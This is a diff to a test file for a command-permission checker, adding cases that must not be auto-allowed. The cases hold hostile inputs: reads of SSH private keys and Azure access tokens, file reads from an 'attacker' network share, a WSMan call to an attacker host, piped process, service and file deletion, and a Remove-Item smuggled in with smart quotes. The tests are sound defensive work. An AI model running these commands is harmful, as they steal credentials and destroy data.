@@ -48,6 +48,25 @@ def test_powershell_that_only_reads_is_allowed(command, cwd):
     "Get-CimInstance Win32_Process -ComputerName srv1",         # another machine
     "Get-Help Get-Item -Online", "Test-Connection example.com",
     "Get-ChildItem " + os.path.join(os.path.expanduser("~"), ".ssh"),
+    # found by the independent review, 2026-10-29
+    r'"${C:\Users\x\.ssh\id_rsa}"', '"$C:notes.txt"', r'"${FileSystem::\\attacker\share\x}"',
+    r"${C:\Users\x\.ssh\id_rsa}", "$C:notes.txt",
+    r".\Get-Evil.ps1", r"C:\tmp\get-x.exe", r"tools\cat.exe x",
+    "Get-Service -Co x", "Get-CimInstance Win32_Process -CimS $s", "Get-WmiObject Win32_Process -Cred x",
+    "Get-WSManInstance -ResourceURI winrm/config -ConnectionURI http://attacker",
+    "Get-Service spooler | % Stop", "Get-Process notepad | % Kill",
+    r"Get-ChildItem C:\repo | ForEach-Object -MemberName Delete",
+    "Get-AzAccessToken", "Get-History", "Get-WindowsUpdateLog",
+    '"a\u201d;Remove-Item\tC:\\x;\u201cb"', r"Get-Content \\attacker\share\x", "Get-Content //attacker/share/x",
+])
+def test_powershell_that_may_do_more_stays_asked_without_a_cwd_too(command):
+    assert not _allowed(_op(command, cwd=None)), command
+
+
+@pytest.mark.parametrize("command", [
+    "Get-ChildItem " + os.path.join(os.path.expanduser("~"), ".ssh"),
+    r'"${C:\Users\x\.ssh\id_rsa}"', r".\Get-Evil.ps1", "Get-Service -Co x", "Get-Process notepad | % Kill",
+    "Get-History", '"a\u201d;Remove-Item\tC:\\x;\u201cb"', r"Get-Content \\attacker\share\x",
 ])
 def test_powershell_that_may_do_more_stays_asked(command):
     assert not _allowed(_op(command)), command
@@ -57,6 +76,12 @@ def test_powershell_that_may_do_more_stays_asked(command):
 def test_a_read_of_an_unreported_directory_stays_asked(command):
     assert _allowed(_op(command))
     assert not _allowed(_op(command, cwd=None)), command
+
+
+def test_a_glob_is_a_read_of_the_directory():
+    bash = {"mars/tool": {"name": "Bash", "shell": "bash"}}
+    assert not _allowed(_op("echo *", cwd=None, meta=bash))
+    assert _allowed(_op("echo hi", cwd=None, meta=bash))
 
 
 def test_verbs_are_read_as_powershell_only():
